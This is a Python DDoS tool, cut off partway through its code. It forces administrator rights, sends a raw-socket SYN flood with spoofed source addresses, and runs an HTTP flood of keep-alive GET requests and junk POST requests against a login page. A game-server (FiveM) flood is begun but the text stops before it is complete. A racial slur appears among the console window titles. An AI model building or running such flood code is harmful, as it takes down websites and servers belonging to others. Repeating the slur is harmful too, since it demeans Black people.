import os
import sys
import time
import random
import ctypes
import threading
import socket
import struct
import ssl
from colorama import init, Fore, Style
import psutil

# Initialize colorama
init(autoreset=True)

# Admin privileges enforcement
def force_admin():
    if os.name == 'nt':
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        except:
            is_admin = False
        if not is_admin:
            print(Fore.YELLOW + "Requesting administrator privileges...")
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
    else:
        if os.geteuid() != 0:
            print(Fore.RED + "This program requires root privileges on Linux!")
            sys.exit(1)

# Global variables
attack_start_time = 0
packets_sent = 0
is_attacking = False
current_title = ""
title_lock = threading.Lock()
packet_lock = threading.Lock()
MAX_THREADS = 5000  # Increased thread limit for more power
MAX_SOCKETS = 20000  # Increased socket limit
stop_event = threading.Event()
resource_monitor_active = False
active_star_attacks = 0
star_lock = threading.Lock()

# ASCII Art
MOON_SOCIETY_ASCII = r"""
                        ⣠⡶⠶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠛⠉⠛⢷⡀⠀⠀
                        ⡟⠀⠀⣸⡷⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⢀⡤⠤⣿⡀⠀
                        ⣷⠀⣼⠋⠀⠀⢹⡀⠀⠀⠀⢠⣶⠟⠛⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣾⠀⠀⠈⢻⡄
                        ⠘⢧⡇⠀⢀⣤⠾⠛⠻⢶⣤⡟⠁⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠀⠀⠘⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠶⣦⡀⠀⠀⣸⡏⣇⠀⠀⠀⣷
⠀                        ⢸⡇⢀⠏⠀⠀⠀⠀⠀⡿⠁⠀⢀⣴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⡷⠿⠝⠛⠻⠿⣿⣶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣏⠀⠀⠀⢻⡀⠀⣾⡤⠛⠒⠲⣤⡇
⠀⠀                        ⣷⢸⠀⠀⠀⡤⠖⠚⠁⠀⠀⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⡿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⢝⠷⣄⠀⠀⠀⠀⠀⠀⠀⠙⣦⠀⠀⢸⡇⣼⠃⣇⠀⠀⠀⠈⢱
⠀⠀                        ⠘⣿⠀⠀⢸⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠙⢋⡤⠖⠒⡖⠒⠀⠀⠀⠀⠙⣏⠓⠲⢤⡀⠀⠁⠈⠳⣄⠀⠀⠀⠀⠀⠀⢸⡇⠀⠘⠿⠁⠀⠈⢳⡆⠀⠀⢠
⠀⠀                        ⠀⢸⡄⠀⠈⠀⣀⣀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⢀⡾⠁⣀⡾⠋⠀⣠⠜⠁⠀⠀⢀⣀⡀⠀⠈⠓⠆⠀⢙⡧⠀⠀⠀⠈⢧⡀⠀⠀⠀⠀⢸⠃⠀⣀⣄⠀⠀⢠⡏⠁⠀⠀⡴
⠀⠀                        ⠀⠀⢷⡀⠀⠀⠀⠈⢳⣄⢀⡇⠀⠀⠀⠀⠀⢠⡟⠀⠀⠉⠁⠀⠀⢀⣤⣶⣾⣿⣿⣿⣿⣿⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⢸⡀⢰⠋⠀⠀⠀⠈⠀⠀⢀⡾⠁
⠀⠀⠀                        ⠀⠈⢷⡀⠀⠀⠀⠀⣿⡞⠁⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠈⠳⣽⡄⠀⠀⠀⠀⣀⡴⠟⠁⠀
⠀⠀⠀⠀                        ⠀⠀⠙⠶⢤⣤⡴⠟⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠈⠿⠦⢤⠶⠟⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⢸⡇⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⢸⡇⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⢸⡇⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠉⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⣷⠀⠀⢰⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⢸⣆⠀⣼⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣇⠀⠀⣰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠀⣿⠀⢿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⠀⣶⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠀⢹⡆⠈⠛⠛⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠃⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠈⢿⣤⣴⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠀⠉⠉⠈⠳⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠛⠻⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⡶⣦⣤⣀⣀⣀⣀⣀⣀⣤⣴⣶⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
"""

ATTACK_ASCII = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⢀⣀⠔⠉⠉⠢⡖⠋⠉⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡏⠉⠉⠉⠓⠚⠛⠉⠉⣝⠀⢠⠒⡴⠓⠢⣤⠔⠛⢤⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠸⡅⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠈⢛⡄⠀⠀⣸⢳⠀⢘⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠈⠙⠙⢌⣁⡠⢮⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣸⡦⠤⠤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣸⣀⡀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣦⠀⠀⠀⣰⣇⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠁⠘⣇⣀⠀⠀⠻⠃⠀⠀⠀⡄⠒⡄⠀⠀⠀⠁⠀⠀⣀⣼⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠙⣆⡤⠀⠀⠀⠀⣀⡤⡬⣩⡖⡦⠀⠀⠀⠀⣠⠞⠁⠈⠑⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⠒⠁⠉⡶⠒⠲⣜⠓⡢⠀⢀⠈⠙⠲⡴⠒⠛⢅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢖⠀⠉⠉⠉⠣⡠⢲⠇⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⢆⣀⢀⡜⠀⠀⠀⠀⠀⠀⠘⣄⣀⣠⠞⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠉⠉⡇⠀⠀⠀⠀⠀⢀⡴⠃⠉⠀⠀⠸⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠀⠘⢦⣀⣀⠴⠚⡇⠀⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⣄⠀⣀⣠⠛⠚⠋⠛⠒⠻⣄⡀⠀⣀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
SECURE_LOADER = r"""
                        ⣠⡶⠶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠛⠉⠛⢷⡀⠀⠀
                        ⡟⠀⠀⣸⡷⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⢀⡤⠤⣿⡀⠀
                        ⣷⠀⣼⠋⠀⠀⢹⡀⠀⠀⠀⢠⣶⠟⠛⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣾⠀⠀⠈⢻⡄
                        ⠘⢧⡇⠀⢀⣤⠾⠛⠻⢶⣤⡟⠁⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠀⠀⠘⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠶⣦⡀⠀⠀⣸⡏⣇⠀⠀⠀⣷
⠀                        ⢸⡇⢀⠏⠀⠀⠀⠀⠀⡿⠁⠀⢀⣴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⡷⠿⠝⠛⠻⠿⣿⣶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣏⠀⠀⠀⢻⡀⠀⣾⡤⠛⠒⠲⣤⡇
⠀⠀                        ⣷⢸⠀⠀⠀⡤⠖⠚⠁⠀⠀⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⡿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⢝⠷⣄⠀⠀⠀⠀⠀⠀⠀⠙⣦⠀⠀⢸⡇⣼⠃⣇⠀⠀⠀⠈⢱
⠀⠀                        ⠘⣿⠀⠀⢸⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠙⢋⡤⠖⠒⡖⠒⠀⠀⠀⠀⠙⣏⠓⠲⢤⡀⠀⠁⠈⠳⣄⠀⠀⠀⠀⠀⠀⢸⡇⠀⠘⠿⠁⠀⠈⢳⡆⠀⠀⢠
⠀⠀                        ⠀⢸⡄⠀⠈⠀⣀⣀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⢀⡾⠁⣀⡾⠋⠀⣠⠜⠁⠀⠀⢀⣀⡀⠀⠈⠓⠆⠀⢙⡧⠀⠀⠀⠈⢧⡀⠀⠀⠀⠀⢸⠃⠀⣀⣄⠀⠀⢠⡏⠁⠀⠀⡴
⠀⠀                        ⠀⠀⢷⡀⠀⠀⠀⠈⢳⣄⢀⡇⠀⠀⠀⠀⠀⢠⡟⠀⠀⠉⠁⠀⠀⢀⣤⣶⣾⣿⣿⣿⣿⣿⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⢸⡀⢰⠋⠀⠀⠀⠈⠀⠀⢀⡾⠁
⠀⠀⠀                        ⠀⠈⢷⡀⠀⠀⠀⠀⣿⡞⠁⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠈⠳⣽⡄⠀⠀⠀⠀⣀⡴⠟⠁⠀
⠀⠀⠀⠀                        ⠀⠀⠙⠶⢤⣤⡴⠟⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠈⠿⠦⢤⠶⠟⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⢸⡇⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⢸⡇⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⢸⡇⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠉⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⣷⠀⠀⢰⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⢸⣆⠀⣼⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣇⠀⠀⣰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠀⣿⠀⢿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⠀⣶⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠀⢹⡆⠈⠛⠛⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠃⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠈⢿⣤⣴⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠀⠉⠉⠈⠳⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠛⠻⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⡶⣦⣤⣀⣀⣀⣀⣀⣀⣤⣴⣶⠛⠉⠀⠀⠀⠀⠀

⠀⠀⠀
"""

# Rainbow gradient function for attack message only
def gradient_text(text):
    colors = [
        Fore.LIGHTRED_EX, Fore.RED, 
        Fore.LIGHTYELLOW_EX, Fore.YELLOW,
        Fore.LIGHTGREEN_EX, Fore.GREEN,
        Fore.LIGHTCYAN_EX, Fore.CYAN,
        Fore.LIGHTBLUE_EX, Fore.BLUE,
        Fore.LIGHTMAGENTA_EX, Fore.MAGENTA
    ]
    result = ""
    steps = len(text)
    color_step = len(colors) / max(1, steps)
    
    for i, char in enumerate(text):
        color_index = int(i * color_step) % len(colors)
        result += colors[color_index] + char
    
    return result

# Title management
def title_manager():
    global current_title, attack_start_time, packets_sent, is_attacking
    titles = [
        " made by Hasan",
        "fuck the niggas",
        " most memes",
        f"do you know your ip is {fake_ip()}"
    ]
    
    while True:
        if is_attacking:
            with title_lock:
                elapsed = int(time.time() - attack_start_time)
                title = f"Attack Time: {elapsed}s | Packets: {packets_sent} | Threads: {threading.active_count()}"
                if os.name == 'nt':
                    ctypes.windll.kernel32.SetConsoleTitleW(title)
                current_title = title
        else:
            title = random.choice(titles)
            if os.name == 'nt':
                ctypes.windll.kernel32.SetConsoleTitleW(title)
            with title_lock:
                current_title = title
        
        time.sleep(0.5)

# Generate fake IP
def fake_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

# Optimized checksum calculation
def calculate_checksum(data):
    """Calculate IP/TCP checksum efficiently"""
    if len(data) % 2:
        data += b'\x00'
    words = struct.unpack('!%dH' % (len(data) // 2), data)
    total = sum(words)
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF

# Resource monitoring to prevent lag
def resource_monitor():
    """Monitor system resources and throttle attacks if needed"""
    global is_attacking
    while True:
        if is_attacking:
            # Get CPU and memory usage
            cpu_percent = psutil.cpu_percent(interval=1)
            mem_percent = psutil.virtual_memory().percent
            
            # Throttle if resources are high
            if cpu_percent > 85 or mem_percent > 85:
                time.sleep(0.1)
            elif cpu_percent > 70 or mem_percent > 70:
                time.sleep(0.05)
            else:
                time.sleep(0.01)
        else:
            time.sleep(1)

# ====================
# SECURE LOGIN PANEL
# ====================

def secure_login():
    """Secure login panel"""
    os.system('cls' if os.name == 'nt' else 'clear')
   
   # Print secure loader ASCII
    print(Fore.LIGHTMAGENTA_EX + SECURE_LOADER)
    print(Fore.MAGENTA + "                                         HASAN LOGIN")
    
    username = input(Fore.CYAN + "\nUsername: " + Fore.WHITE)
    password = input(Fore.CYAN + "Password: " + Fore.WHITE)
    
    # Validate credentials
    if username == "hasan" and password == "hasan":
        print(Fore.GREEN + "\nAuthentication successful!")
        time.sleep(1)
        return True
    
            # Reprint header after failed attempt
    print(Fore.LIGHTMAGENTA_EX + SECURE_LOADER)
    print(Fore.MAGENTA + "                                                            HASAN LOGIN")
    print(Style.RESET_ALL + "="*80)

# POWERFUL ATTACK METHODS (OPTIMIZED)
# ====================

def syn_flood(target, port, duration, thread_id):
    """Massive SYN flood with raw sockets and spoofing"""
    global packets_sent
    start_time = time.time()
    
    # Create raw socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)  # Increased buffer size
    except Exception as e:
        return
    
    # Pre-calculate static parts of the packet
    ip_ver_ihl = 0x45
    ip_tos = 0
    ip_len = 40
    ip_ttl = 64
    ip_proto = socket.IPPROTO_TCP
    ip_checksum = 0
    ip_dst = socket.inet_aton(target)
    
    tcp_offset = 5 << 4
    tcp_flags = 0b00000010  # SYN flag
    tcp_window = socket.htons(65535)
    tcp_urg = 0
    
    while time.time() - start_time < duration:
        try:
            # Generate random source IP and port
            source_ip = fake_ip()
            source_port = random.randint(1024, 65535)
            seq = random.randint(0, 4294967295)
            ip_id = random.randint(1, 65535)
            ip_frag = 0
            
            # IP Header
            ip_src = socket.inet_aton(source_ip)
            ip_header = struct.pack('!BBHHHBBH', 
                ip_ver_ihl, ip_tos, ip_len, 
                ip_id, ip_frag, ip_ttl, ip_proto, ip_checksum) + ip_src + ip_dst
            
            # TCP Header
            tcp_header = struct.pack('!HHLLBBHHH', 
                source_port, port, seq, 0, 
                tcp_offset, tcp_flags, tcp_window, 0, tcp_urg)
            
            # Pseudo header for checksum
            pseudo_header = struct.pack('!4s4sBBH', 
                ip_src, ip_dst, 0, socket.IPPROTO_TCP, len(tcp_header))
            
            pseudo_packet = pseudo_header + tcp_header
            tcp_checksum = calculate_checksum(pseudo_packet)
            
            # Repack TCP header with checksum
            tcp_header = struct.pack('!HHLLBBH', 
                source_port, port, seq, 0, 
                tcp_offset, tcp_flags, tcp_window) + struct.pack('H', tcp_checksum) + struct.pack('!H', tcp_urg)
            
            # Send packet
            sock.sendto(ip_header + tcp_header, (target, 0))
            
            with packet_lock:
                packets_sent += 1
                
        except Exception as e:
            # Recreate socket if there's an error
            try:
                sock.close()
            except:
                pass
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
            except:
                return
    
    try:
        sock.close()
    except:
        pass

def http_flood(target, port, duration, thread_id):
    """High-performance HTTP flood with keep-alive"""
    global packets_sent
    start_time = time.time()
    
    # HTTP payload templates
    payloads = [
        f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Connection: keep-alive\r\n"
        "Cache-Control: no-cache\r\n"
        "Pragma: no-cache\r\n\r\n",
        
        f"POST /login.php HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {random.randint(50,200)}\r\n"
        "Connection: keep-alive\r\n\r\n"
        f"username={random.getrandbits(128):x}&password={random.getrandbits(256):x}"
    ]
    
    # Create socket pool
    sockets = []
    for _ in range(50):  # Create a pool of sockets
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            sockets.append(sock)
        except:
            pass
    
    while time.time() - start_time < duration:
        try:
            # Use sockets from pool
            if not sockets:
                # Replenish socket pool if empty
                for _ in range(50):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        sock.connect((target, port))
                        sockets.append(sock)
                    except:
                        pass
                continue
            
            sock = random.choice(sockets)
            
            try:
                payload = random.choice(payloads)
                sock.sendall(payload.encode())
                with packet_lock:
                    packets_sent += 1
            except:
                # Remove dead socket
                sockets.remove(sock)
                try:
                    sock.close()
                except:
                    pass
                continue
            
            # Small delay between requests
            time.sleep(0.001)
        except:
            pass
    
    # Close all sockets in pool
    for sock in sockets:
        try:
            sock.close()
        except:
            pass

def fivem_http_flood(target, port, duration, thread_id):
    """Specialized FiveM server flood with multiple endpoints"""
    global packets_sent
    start_time = time.time()
    
    # FiveM-specific endpoints
    endpoints = [
